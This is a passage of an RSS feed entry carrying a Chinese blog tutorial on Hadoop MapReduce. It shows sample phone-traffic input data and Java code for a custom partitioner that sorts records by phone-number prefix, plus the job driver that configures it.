class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.100&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.8&lt;/span&gt;   &lt;span class=&quot;hljs-selector-tag&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.baidu&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.com&lt;/span&gt;   3659    3538    200&lt;br/&gt;12     15959002129 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.100&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.9&lt;/span&gt;   &lt;span class=&quot;hljs-selector-tag&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.atguigu&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.com&lt;/span&gt; 1938    180     500&lt;br/&gt;13     13560439638 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.100&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.10&lt;/span&gt;                  918     4938    200&lt;br/&gt;14     13470253144 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.100&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.11&lt;/span&gt;                  180     180     200&lt;br/&gt;15     13682846555 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.100&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.12&lt;/span&gt;  &lt;span class=&quot;hljs-selector-tag&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.qq&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.com&lt;/span&gt;      1938    2910    200&lt;br/&gt;16     13992314666 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.100&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.13&lt;/span&gt;  &lt;span class=&quot;hljs-selector-tag&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.gaga&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.com&lt;/span&gt;    3008    3720    200&lt;br/&gt;17     13509468723 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.100&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.14&lt;/span&gt;  &lt;span class=&quot;hljs-selector-tag&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.qinghua&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.com&lt;/span&gt; 7335    110349  404&lt;br/&gt;18     18390173782 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.100&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.15&lt;/span&gt;  &lt;span class=&quot;hljs-selector-tag&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.sogou&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.com&lt;/span&gt;   9531    2412    200&lt;br/&gt;19     13975057813 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.100&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.16&lt;/span&gt;  &lt;span class=&quot;hljs-selector-tag&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.baidu&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.com&lt;/span&gt;   11058   48243   200&lt;br/&gt;20     13768778790 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.100&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.17&lt;/span&gt;                  120     120     200&lt;br/&gt;21     13568436656 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.100&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.18&lt;/span&gt;  &lt;span class=&quot;hljs-selector-tag&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.alibaba&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.com&lt;/span&gt; 2481    24681   200&lt;br/&gt;22     13568436656 192&lt;span class=&quot;hljs-selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.100&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.19&lt;/span&gt;                  1116    954     200&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;（2）期望输出数据&lt;br/&gt;  手机号136、137、138、139开头都分别放到一个独立的4个文件中，其他开头的放到一个文件中。&lt;br/&gt;2、需求分析&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/krcFE9.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;3、在案例2.4的基础上，增加一个分区类
&lt;pre readability=&quot;9.5&quot;&gt;
&lt;code class=&quot;hljs java&quot; readability=&quot;13&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;package&lt;/span&gt; com.atguigu.mr.flowsum;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.io.Text;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.Partitioner;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;ProvincePartitioner&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;Partitioner&lt;/span&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;Text&lt;/span&gt;, &lt;span class=&quot;hljs-title&quot;&gt;FlowBean&lt;/span&gt;&amp;gt; &lt;/span&gt;{&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;getPartition&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(Text key, FlowBean value, &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; numPartitions)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;String prePhoneNum = key.toString().substring(&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; partition = &lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;hljs-string&quot;&gt;&quot;136&quot;&lt;/span&gt;.equals(prePhoneNum)) {&lt;br/&gt;partition = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;;&lt;br/&gt;} &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;hljs-string&quot;&gt;&quot;137&quot;&lt;/span&gt;.equals(prePhoneNum)) {&lt;br/&gt;partition = &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;;&lt;br/&gt;} &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;hljs-string&quot;&gt;&quot;138&quot;&lt;/span&gt;.equals(prePhoneNum)) {&lt;br/&gt;partition = &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;;&lt;br/&gt;} &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;hljs-string&quot;&gt;&quot;139&quot;&lt;/span&gt;.equals(prePhoneNum)) {&lt;br/&gt;partition = &lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; partition;&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;4、在驱动函数中增加自定义数据分区设置和ReduceTask设置&lt;/p&gt;
&lt;pre readability=&quot;21.5&quot;&gt;
&lt;code class=&quot;hljs dart&quot; readability=&quot;37&quot;&gt;package com.atguigu.mr.flowsum;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; java.io.IOException;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.conf.Configuration;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.fs.Path;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.io.Text;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.Job;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.lib.input.FileInputFormat;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;&lt;/p&gt;&lt;p&gt;public &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;FlowsumDriver&lt;/span&gt; &lt;/span&gt;{&lt;/p&gt;&lt;p&gt;public &lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; main(&lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt;[] args) throws IOException, ClassNotFoundException, InterruptedException {&lt;/p&gt;&lt;p&gt;&lt;br/&gt;args = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt;[] { &lt;span class=&quot;hljs-string&quot;&gt;&quot;d:/temp/atguigu/0529/input/inputflow&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;d:/temp/atguigu/0529/output2&quot;&lt;/span&gt; };&lt;/p&gt;&lt;p&gt;&lt;br/&gt;Configuration configuration = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Configuration();&lt;br/&gt;Job job = Job.getInstance(configuration);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;job.setJarByClass(FlowsumDriver.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;job.setMapperClass(FlowCountMapper.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;br/&gt;job.setReducerClass(FlowCountReducer.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;job.setMapOutputKeyClass(Text.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;br/&gt;job.setMapOutputValueClass(FlowBean.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;job.setOutputKeyClass(Text.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;br/&gt;job.setOutputValueClass(FlowBean.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;job.setPartitionerClass(ProvincePartitioner.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;br/&gt;job.setNumReduceTasks(&lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;FileInputFormat.setInputPaths(job, &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Path(args[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;]));&lt;br/&gt;FileOutputFormat.setOutputPath(job, &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Path(args[&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;]));&lt;/p&gt;&lt;p&gt;&lt;br/&gt;boolean result = job.waitForCompletion(&lt;span class=&quot;hljs-keyword&quot;&gt;true&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;System.exit(result ? &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt; : &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;);&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Fri, 15 Feb 2019 15:29:00 +0000</pubDate>
<dc:creator>黑泽君</dc:creator>
<og:description>第3章 MapReduce框架原理3.1 InputFormat数据输入3.1.1 切片与MapTask并行度决定机制3.1.2 Job提交流程源码和切片源码详解3.1.3 FileInputForm</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/chenmingjun/p/10386461.html</dc:identifier>
</item>
</channel>
</rss>